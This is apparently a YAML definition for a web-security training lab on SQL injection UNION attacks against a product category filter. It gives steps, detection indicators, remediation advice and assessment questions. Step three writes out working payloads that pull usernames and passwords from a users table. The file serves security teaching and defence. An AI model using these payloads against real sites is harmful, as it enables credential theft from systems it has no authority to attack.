@@ -1,0 +1,94 @@
+# Category: SQL Injection
+name: "SQL injection UNION attack, retrieving data from other tables"
+id: "sql-injection-union-retrieve-other-tables-001"
+category: "sql_injection"
+subcategory: "union_attack"
+difficulty: "practitioner"
+estimated_time: "45 minutes"
+
+description: |
+  This lab contains a SQL injection vulnerability in the product category filter.
+  The attacker needs to retrieve data from other tables in the database using
+  a UNION attack. The goal is to extract sensitive information such as usernames
+  and passwords from the `users` table.
+
+learning_objectives:
+  - Understand UNION attacks for data retrieval
+  - Extract data from other tables
+  - Combine UNION with data type identification
+
+tools:
+  - Burp Suite
+  - curl
+
+prerequisites:
+  - Basic understanding of SQL
+  - Access to the lab environment
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify the vulnerable parameter"
+    commands:
+      - "# Browse to the lab and select a category"
+      - "# Intercept the request in Burp Suite"
+    expected_output: "The category parameter is used in a SQL query"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Determine the number of columns and find a text column"
+    commands:
+      - "# Use ORDER BY and UNION SELECT with string literals"
+    expected_output: "Column count and text column identified"
+    detection: "Database error messages"
+
+  - id: "step3"
+    phase: "data_extraction"
+    action: "Retrieve data from the users table"
+    commands:
+      - "# Assuming 2 columns, with the second being text"
+      - "category=Gifts' UNION SELECT NULL, username FROM users--"
+      - "# Then extract passwords"
+      - "category=Gifts' UNION SELECT NULL, password FROM users--"
+    expected_output: "Usernames and passwords extracted"
+    detection: "Database logs may show unusual queries"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "SQL keywords in URL parameters"
+  log_indicators:
+    - "Database error messages"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Use parameterized queries"
+    - "Restrict database user privileges"
+  long_term:
+    - "Implement input validation"
+    - "Use an ORM"
+
+variables:
+  lab_url: "https://lab-id.web-security-academy.net"
+  category_param: "category"
+
+assessment_questions:
+  - "What is the purpose of a UNION attack?"
+  - "Why do you need to know the number of columns?"
+  - "What is the difference between UNION and UNION ALL?"
+
+references:
+  - url: "https://portswigger.net/web-security/sql-injection"
+    title: "PortSwigger SQL Injection"
+  - url: "https://owasp.org/www-community/attacks/SQL_Injection"
+    title: "OWASP SQL Injection"
